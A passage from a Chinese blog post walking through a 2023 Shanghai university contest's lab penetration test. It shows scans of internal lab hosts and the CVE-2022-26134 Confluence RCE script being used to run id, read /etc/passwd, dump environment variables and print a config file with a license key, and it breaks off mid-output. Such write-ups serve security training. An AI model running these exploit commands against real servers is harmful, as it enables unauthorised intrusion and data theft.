<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Pentest | 2023 第八届上海市大学生网络安全大赛 / 磐石行动 漏洞挖掘 Walkthrough, MiaoTony,blog">
    <meta name="description" content="今年的上海市赛新加了漏洞挖掘环节，实际上是给了四套自带内网的靶场让选手打渗透，两天打下来感觉还是挺坑的，这篇博客就来记录下渗透挖洞的过程吧。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>Pentest | 2023 第八届上海市大学生网络安全大赛 / 磐石行动 漏洞挖掘 Walkthrough | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
	
    <script src="/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 6.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Pentest | 2023 第八届上海市大学生网络安全大赛 / 磐石行动 漏洞挖掘 Walkthrough</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-05-30
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    15.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    86 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <blockquote>
<p>本文首发于 SecIN 社区： <a target="_blank" rel="noopener" href="https://sec-in.com/article/2226">https://sec-in.com/article/2226</a> , <a target="_blank" rel="noopener" href="https://sec-in.com/article/2227">https://sec-in.com/article/2227</a></p>
</blockquote>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/WechatIMG12678.jpeg"></p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
<p><strong>第八届上海市大学生网络安全大赛</strong></p>
<p><strong>暨“磐石行动”2023（首届）大学生网络安全邀请赛</strong> </p>
<p>—— CTF比赛</p>
<p>2023.5.20 9:00 - 21:00</p>
<p>—— 漏洞挖掘比赛</p>
<p>2023.5.21 00:00 - 2023.5.22 24:00</p>
</blockquote>
<p><strong>CTF 比赛的 Writeup</strong> 可以参考喵喵的上一篇博客：</p>
<p><a href="https://miaotony.xyz/2023/05/25/CTF_2023ShanghaiPanshixingdong/">CTF | 2023 第八届上海市大学生网络安全大赛 / 磐石行动 CTF部分 WriteUp</a></p>
<p>今年的上海市赛新加了漏洞挖掘环节，实际上是给了四套自带内网的靶场让选手打渗透，两天打下来感觉还是挺坑的，这篇博客就来记录下 <strong>渗透挖洞的过程</strong> 吧。</p>
<p>既然是 Walkthrough，那文中必然有不少走错路的时候，说不定还有写得不对的地方，师傅们看的时候就当听故事好了（哈哈</p>
<p><strong>notice</strong></p>
<blockquote>
<p><strong>关于flag内容</strong></p>
<p>并非所有容器都有flag，有flag的服务器linux系统存放在/root/目录下，windows系统存放在桌面目录下，仅 &lt;漏洞挖掘场景3&gt; 中，有一个flag存放位置不在上述目录，可通过find查找到flag文件。</p>
<p>请各位选手注意，场景在完成全部作答后在平台中题目上会显示已解决图标，若没有完成全部作答则说明还没有获取全部答案，需要继续进行！</p>
<p>另外漏洞挖掘赛场景总共就4套 不会再发布其他题目 题目里面一台机器就一个flag 根据平台公告内容 <strong>如果不在指定位置就是没有flag</strong> 继续玩下去找 一个场景里面含有3-6台服务器</p>
<p><strong>关于赛题难度</strong></p>
<p>赛题难度排序为（由高至低）：场景3-&gt;场景2-&gt;场景4-&gt;场景1</p>
<p><strong>关于赛题场景内数量</strong></p>
<p>以下为场景及flag数量信息；<br>场景1：3台服务器，2个flag；场景2：6台服务器，4个flag；场景3：6台服务器，4个flag；场景4：4台服务器，3个flag</p>
<p>关于场景3的flag公告<br> 场景3的flag仅最后一个需要find，其他flag都在可见位置。</p>
</blockquote>
<p>不知道是不是第一年办漏洞挖掘比赛的原因，其实感觉挺坑的，第一天比赛的时候都不透露每个场景里有多少机器以及多少个 flag，而且不是拿下了一台机器就一定有 flag，就得硬猜。</p>
<p>于是第一天凌晨喵喵在看场景 3 的时候日了入口机器，他公告写了 有个 flag 不在默认目录要自己 find，但是喵喵找死找不到 flag，直到比赛第二天快结束了才说不在指定位置就是这台机器没有 flag，人麻了。。</p>
<h2 id="漏洞挖掘场景2-1-x2F-4"><a href="#漏洞挖掘场景2-1-x2F-4" class="headerlink" title="漏洞挖掘场景2 [1/4]"></a>漏洞挖掘场景2 [1/4]</h2><pre class="line-numbers language-none"><code class="language-none">(icmp) Target 10.103.252.84   is alive
[*] Icmp alive hosts len is: 1
10.103.252.84:22 open
10.103.252.84:3306 open
10.103.252.84:8090 open
[*] alive ports len is: 3

重新扫 
(icmp) Target 10.103.187.168  is alive
[*] Icmp alive hosts len is: 1
10.103.187.168:22 open
10.103.187.168:3306 open
10.103.187.168:8090 open
10.103.187.168:8091 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://10.103.187.168:8091 code:204 len:0      title:None
[*] WebTitle: http://10.103.187.168:8090 code:302 len:0      title:None 跳转url: http://10.103.187.168:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true
[*] WebTitle: http://10.103.187.168:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true code:200 len:33317  title:登录 - Confluence
[+] InfoScan:http://10.103.187.168:8090/login.action?os_destination=%2Findex.action&amp;permissionViolation=true [ATLASSIAN-Confluence]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><a target="_blank" rel="noopener" href="http://10.103.252.84:8090/">http://10.103.252.84:8090/</a></p>
<p>基于 Atlassian Confluence 7.14.2 技术构建</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/274026">CVE-2022-26134 Confluence OGNL RCE 漏洞分析</a></p>
<p>天下大木头师傅的 <a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1755">Confluence CVE-2022-26134 漏洞分析</a></p>
<p>Confluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability</p>
<p><a target="_blank" rel="noopener" href="https://github.com/nxtexploit/CVE-2022-26134">https://github.com/nxtexploit/CVE-2022-26134</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python CVE-2022-26134.py http://10.103.252.84:8090/ <span class="token function">id</span>
Confluence target version: <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span>94m7.14.2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span>m
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>confluence<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>confluence<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>confluence<span class="token punctuation">)</span>

$ <span class="token function">uname</span> -a
Linux localhost <span class="token number">3.10</span>.0-1160.80.1.el7.x86_64 <span class="token comment">#1 SMP Tue Nov 8 15:48:59 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>

<span class="token assign-left variable">NAME</span><span class="token operator">=</span><span class="token string">"CentOS Linux"</span> <span class="token assign-left variable">VERSION</span><span class="token operator">=</span><span class="token string">"7 (Core)"</span> <span class="token assign-left variable">ID</span><span class="token operator">=</span><span class="token string">"centos"</span> <span class="token assign-left variable">ID_LIKE</span><span class="token operator">=</span><span class="token string">"rhel fedora"</span> <span class="token assign-left variable">VERSION_ID</span><span class="token operator">=</span><span class="token string">"7"</span> <span class="token assign-left variable">PRETTY_NAME</span><span class="token operator">=</span><span class="token string">"CentOS Linux 7 (Core)"</span> <span class="token assign-left variable">ANSI_COLOR</span><span class="token operator">=</span><span class="token string">"0;31"</span> <span class="token assign-left variable">CPE_NAME</span><span class="token operator">=</span><span class="token string">"cpe:/o:centos:centos:7"</span> <span class="token assign-left variable">HOME_URL</span><span class="token operator">=</span><span class="token string">"https://www.centos.org/"</span> <span class="token assign-left variable">BUG_REPORT_URL</span><span class="token operator">=</span><span class="token string">"https://bugs.centos.org/"</span>  <span class="token assign-left variable">CENTOS_MANTISBT_PROJECT</span><span class="token operator">=</span><span class="token string">"CentOS-7"</span> <span class="token assign-left variable">CENTOS_MANTISBT_PROJECT_VERSION</span><span class="token operator">=</span><span class="token string">"7"</span> <span class="token assign-left variable">REDHAT_SUPPORT_PRODUCT</span><span class="token operator">=</span><span class="token string">"centos"</span> <span class="token assign-left variable">REDHAT_SUPPORT_PRODUCT_VERSION</span><span class="token operator">=</span><span class="token string">"7"</span>


root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User <span class="token keyword">for</span> polkitd:/:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:995::/var/lib/chrony:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false confluence:x:1001:1001:Atlassian Confluence:/home/confluence:/bin/bash

$ <span class="token function">ls</span> /
bin boot dev etc home lib lib64 media mnt network.ini opt proc root run sbin srv sys tmp usr var

$ <span class="token builtin class-name">pwd</span>
/opt/atlassian/confluence/bin

$ <span class="token function">ls</span>
bootstrap.jar catalina.bat catalina.sh catalina-tasks.xml ciphers.bat ciphers.sh commons-daemon.jar configtest.bat configtest.sh confluence-context-path-extractor.jar daemon.sh digest.bat digest.sh display-help.bat display-help.sh install_linux_service.sh makebase.bat makebase.sh OS X - Run Confluence In Background.command OS X - Run Confluence In Terminal Window.command OS X - Stop Confluence.command service.bat setclasspath.bat setclasspath.sh setenv.bat setenv.sh setjre.bat setjre.sh setup_user.sh shutdown.bat shutdown.sh start-confluence.bat start-confluence.sh startup.bat startup.sh stop-confluence.bat stop-confluence.sh synchrony synchrony-proxy-watchdog.jar tcnative-1.dll tomcat9.exe tomcat9w.exe tomcat-juli.jar tool-wrapper.bat tool-wrapper.sh update-acl-for-custom-confluence-folder.bat user.sh version.bat version.sh

$ <span class="token function">env</span>
<span class="token assign-left variable"><span class="token environment constant">OLDPWD</span></span><span class="token operator">=</span>/opt/atlassian/confluence <span class="token assign-left variable">JDK_JAVA_OPTIONS</span><span class="token operator">=</span> --add-opens<span class="token operator">=</span>java.base/java.lang<span class="token operator">=</span>ALL-UNNAMED --add-opens<span class="token operator">=</span>java.base/java.io<span class="token operator">=</span>ALL-UNNAMED --add-opens<span class="token operator">=</span>java.base/java.util<span class="token operator">=</span>ALL-UNNAMED --add-opens<span class="token operator">=</span>java.base/java.util.concurrent<span class="token operator">=</span>ALL-UNNAMED --add-opens<span class="token operator">=</span>java.rmi/sun.rmi.transport<span class="token operator">=</span>ALL-UNNAMED <span class="token assign-left variable">JAVA_OPTS</span><span class="token operator">=</span>-javaagent:/opt/atlassian/atlassian-agent-v1.3.1/atlassian-agent.jar  -Djdk.tls.ephemeralDHKeySize<span class="token operator">=</span><span class="token number">2048</span> -Djava.protocol.handler.pkgs<span class="token operator">=</span>org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK<span class="token operator">=</span>0027 <span class="token assign-left variable">JRE_HOME</span><span class="token operator">=</span>/opt/atlassian/confluence/jre/ <span class="token assign-left variable">START_CONFLUENCE_JAVA_OPTS</span><span class="token operator">=</span>-Datlassian.plugins.startup.options<span class="token operator">=</span><span class="token string">''</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/opt/atlassian/confluence/bin <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US.UTF-8 <span class="token assign-left variable">CATALINA_OPTS</span><span class="token operator">=</span>-Datlassian.plugins.startup.options<span class="token operator">=</span><span class="token string">''</span> -Dorg.apache.tomcat.websocket.DEFAULT_BUFFER_SIZE<span class="token operator">=</span><span class="token number">32768</span> -Dconfluence.context.path<span class="token operator">=</span> -Djava.locale.providers<span class="token operator">=</span>JRE,SPI,CLDR -Dsynchrony.enable.xhr.fallback<span class="token operator">=</span>true -Datlassian.plugins.enable.wait<span class="token operator">=</span><span class="token number">300</span> -Djava.awt.headless<span class="token operator">=</span>true -Xloggc:/opt/atlassian/confluence/logs/gc-2023-05-20_21-14-22.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles<span class="token operator">=</span><span class="token number">5</span> -XX:GCLogFileSize<span class="token operator">=</span>2M -Xlog:gc+age<span class="token operator">=</span>debug:file<span class="token operator">=</span>/opt/atlassian/confluence/logs/gc-2023-05-20_21-14-22.log::filecount<span class="token operator">=</span><span class="token number">5</span>,filesize<span class="token operator">=</span>2M -XX:G1ReservePercent<span class="token operator">=</span><span class="token number">20</span> -XX:+UseG1GC -XX:+ExplicitGCInvokesConcurrent -XX:+PrintGCDateStamps -XX:+IgnoreUnrecognizedVMOptions -XX:ReservedCodeCacheSize<span class="token operator">=</span>256m -Xms1024m -Xmx1024m  <span class="token assign-left variable">CONFLUENCE_CONTEXT_PATH</span><span class="token operator">=</span> <span class="token assign-left variable">CONF_USER</span><span class="token operator">=</span>confluence <span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">CATALINA_PID</span><span class="token operator">=</span>/opt/atlassian/confluence/work/catalina.pid <span class="token assign-left variable">_</span><span class="token operator">=</span>/opt/atlassian/confluence/jre//bin/java <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag 在 /root/ 目录下，当前用户权限，找个地方提权，mysql？</p>
<p>数据库的配置文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python CVE-2022-26134.py http://10.103.252.84:8090/ <span class="token string">"cat /var/atlassian/application-data/confluence/confluence.cfg.xml"</span>
Confluence target version: <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span>94m7.14.2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span>m
<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>confluence-configuration<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span>setupStep<span class="token operator">&gt;</span>complete<span class="token operator">&lt;</span>/setupStep<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span>setupType<span class="token operator">&gt;</span>custom<span class="token operator">&lt;</span>/setupType<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span>buildNumber<span class="token operator">&gt;</span><span class="token number">880</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>/buildNumber<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span>properties<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"admin.ui.allow.daily.backup.custom.location"</span><span class="token operator">&gt;</span>false<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"admin.ui.allow.manual.backup.download"</span><span class="token operator">&gt;</span>false<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"admin.ui.allow.site.support.email"</span><span class="token operator">&gt;</span>false<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"atlassian.license.message"</span><span class="token operator">&gt;</span>AAABLA0ODAoPeJxtkFtLwzAUgN/zKwI+Z6ytRRQCZm0Y0zYdttv0MatnGsiykktx/97s9iLCeTm3j ++cuy4AZoPFaY6T/CnJYuCi7XA6TTNUguutGrw6GFoczE4HMD0gEfZbsM1u5cA6ShJUWJCnoVJ6o KdNMr0naY7ijpe9F3IP1IPzCeojZRJLaowVG+A2wmupNFVmVE5tNTy7HgxMjEZ8lDqc4XQntYMLo VKx76A7DnCGF01d87diwSoUQcaDkVGU/wzKHi9SWfZAkvQkdQbcTih0cB6sOHyCo1PUckE/mhWu2 SvHNccMt6zESyZKNkGN/ZJGuYuMEmvVqlnFccdZjVqwI9hFSWfzJifzuViR5PF9QzYv7RpdbWO3W pS37H+5ZbD9t3Tw55O/GO2IwTAsAhRUWCE6ipB5qHBRf+XtHnqnX1gdHgIUFvOiPKmn4ZhUVuqgO <span class="token assign-left variable">F6E9COcGh8</span><span class="token operator">=</span>X02f<span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"attachments.dir"</span><span class="token operator">&gt;</span><span class="token variable">${confluenceHome}</span>/attachments<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"confluence.setup.locale"</span><span class="token operator">&gt;</span>zh_CN<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"confluence.setup.server.id"</span><span class="token operator">&gt;</span>BGO5-GGNU-19XW-WJSV<span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"confluence.webapp.context.path"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/property<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"finalizedBuildNumber"</span><span class="token operator">&gt;</span><span class="token number">880</span><span class="token operator"><span 